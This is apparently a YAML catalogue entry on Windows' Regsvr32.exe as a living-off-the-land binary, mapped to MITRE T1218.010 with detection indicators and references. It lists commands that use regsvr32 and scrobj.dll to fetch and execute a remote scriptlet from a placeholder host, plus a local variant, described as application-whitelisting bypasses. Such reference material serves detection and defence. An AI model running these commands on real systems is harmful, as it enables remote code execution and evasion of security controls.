---
Name: Regsvr32.exe
Description: Used by Windows to register dlls
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    Description: Execute the specified remote .SCT script with scrobj.dll.
    Usecase: Execute code from remote scriptlet, bypass Application whitelisting
    Category: AWL bypass
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
    Description: Execute the specified local .SCT script with scrobj.dll.
    Usecase: Execute code from scriptlet, bypass Application whitelisting
    Category: AWL bypass
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    Description: Execute the specified remote .SCT script with scrobj.dll.
    Usecase: Execute code from remote scriptlet, bypass Application whitelisting
    Category: Execute
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
    Description: Execute the specified local .SCT script with scrobj.dll.
    Usecase: Execute code from scriptlet, bypass Application whitelisting
    Category: Execute
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\regsvr32.exe
  - Path: C:\Windows\SysWOW64\regsvr32.exe
Code_Sample:
- Code:
Detection:
 - IOC: regsvr32.exe getting files from Internet
 - IOC: regsvr32.exe executing scriptlet files
Resources:
  - Link: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
  - Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  - Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
